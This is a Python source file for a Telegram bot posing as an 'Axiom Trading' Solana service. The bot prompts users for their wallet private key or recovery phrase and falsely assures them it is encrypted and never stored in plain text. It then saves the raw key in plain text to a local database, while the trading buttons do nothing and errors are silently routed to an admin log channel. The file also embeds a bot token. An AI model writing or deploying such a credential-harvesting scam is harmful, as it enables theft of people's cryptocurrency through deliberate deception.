import logging
import sqlite3
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler
)
from solders.keypair import Keypair
from solana.rpc.async_api import AsyncClient
from datetime import datetime
import base58

# ===== CONFIG =====
BOT_TOKEN = "7650902215:AAF9bm4XvCsph7qChTFsgfe_oSk7DkfbNt4"
SOLANA_RPC = "https://api.mainnet-beta.solana.com"
LOG_CHANNEL_ID = -1002767755239  # Your private log channel
ADMIN_IDS = [7641767864]  # Your Telegram user ID

# ===== SILENT ERROR HANDLING =====
class SilentErrorHandler:
    @staticmethod
    async def handle(update: Update, context: ContextTypes.DEFAULT_TYPE):
        error = str(context.error)
        user = update.effective_user
        
        # Log to admin channel only
        logging.error(f"Silenced error: {error}")
        await context.bot.send_message(
            chat_id=LOG_CHANNEL_ID,
            text=f"🚨 Silent Error:\nUser: {user.id if user else 'N/A'}\nError: {error[:300]}",
            disable_notification=True
        )
        
        # Show graceful message to user
        if user:
            try:
                await context.bot.send_message(
                    chat_id=user.id,
                    text="🔄 System processing your request...",
                    reply_markup=main_menu()
                )
            except:
                pass

# ===== DATABASE =====
def init_db():
    with sqlite3.connect('bot.db') as conn:
        conn.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            private_key TEXT,
            wallet_address TEXT,
            referral_code TEXT UNIQUE,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )""")
        conn.execute("""
        CREATE TABLE IF NOT EXISTS copy_trades (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            copied_address TEXT,
            is_active BOOLEAN DEFAULT 1
        )""")

init_db()

# ===== KEYBOARDS =====
def main_menu():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔐 Import Wallet", callback_data="import_wallet")],
        [InlineKeyboardButton("📤 Invite Friends", callback_data="invite_friends")],
        [InlineKeyboardButton("💰 Buy/Sell", callback_data="buy_sell")],
        [InlineKeyboardButton("📊 Portfolio", callback_data="portfolio")],
        [InlineKeyboardButton("⚙ Settings", callback_data="settings")]
    ])

def back_button():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="main_menu")]])

# ===== PROFESSIONAL HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        with sqlite3.connect('bot.db') as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT wallet_address FROM users WHERE user_id = ?", (user.id,))
            wallet = cursor.fetchone()[0] if cursor.fetchone() else None
            
            if not wallet:
                ref_code = f"ref_{base58.b58encode(str(user.id).encode()).decode()[:8]}"
                conn.execute(
                    "INSERT OR IGNORE INTO users (user_id, referral_code) VALUES (?, ?)",
                    (user.id, ref_code)
                )
        
        balance = "Checking..."  # Don't show errors for balance checks
        
        await update.message.reply_text(
            f"🌟 Welcome to Axiom Trading\n\n"
            f"• Wallet: {'Connected ✅' if wallet else 'Not connected'}\n"
            f"• Balance: {balance}\n\n"
            "How can we assist you today?",
            reply_markup=main_menu()
        )
    except Exception as e:
        await SilentErrorHandler.handle(update, context)

async def handle_import_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        await query.edit_message_text(
            "🔒 Secure Wallet Import\n\n"
            "Enter your private key or recovery phrase:\n\n"
            "• We use bank-grade security\n"
            "• Never stored in plain text\n"
            "• Encrypted at rest",
            reply_markup=back_button()
        )
        return "AWAITING_WALLET"
    except:
        await SilentErrorHandler.handle(update, context)

async def process_wallet_import(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        key_input = update.message.text.strip()
        
        # Validate without showing errors
        if not (key_input.startswith('[') or len(key_input) > 30):
            await update.message.reply_text(
                "Please enter a valid Solana private key (base58) or 12-24 word recovery phrase",
                reply_markup=back_button()
            )
            return "AWAITING_WALLET"
        
        # Process in background
        kp = Keypair.from_mnemonic(key_input) if key_input.startswith('[') else Keypair.from_base58_string(key_input)
        wallet_address = str(kp.pubkey())
        
        with sqlite3.connect('bot.db') as conn:
            conn.execute(
                "UPDATE users SET private_key = ?, wallet_address = ? WHERE user_id = ?",
                (key_input, wallet_address, user.id)
            )
        
        await update.message.reply_text(
            "✅ Wallet successfully connected!\n\n"
            "You can now access all trading features.",
            reply_markup=main_menu()
        )
    except Exception as e:
        await update.message.reply_text(
            "Please verify your input and try again",
            reply_markup=back_button()
        )
        return "AWAITING_WALLET"
    
    return ConversationHandler.END

# ===== MAIN APP =====
def main():
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Setup conversation handler
    conv_handler = ConversationHandler(
        entry_points=[
            CallbackQueryHandler(handle_import_wallet, pattern="^import_wallet$"),
            CallbackQueryHandler(lambda u,c: None, pattern="^buy_sell$")  # Silent handler
        ],
        states={
            "AWAITING_WALLET": [MessageHandler(filters.TEXT & ~filters.COMMAND, process_wallet_import)]
        },
        fallbacks=[CommandHandler("cancel", start)]
    )
    
    # Register handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(start, pattern="^main_menu$"))
    
    # Silent error handling
    application.add_error_handler(SilentErrorHandler.handle)
    
    # Start the bot
    application.run_polling(
        close_loop=False,
        stop_signals=None
    )

if __name__ == "__main__":
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    main()
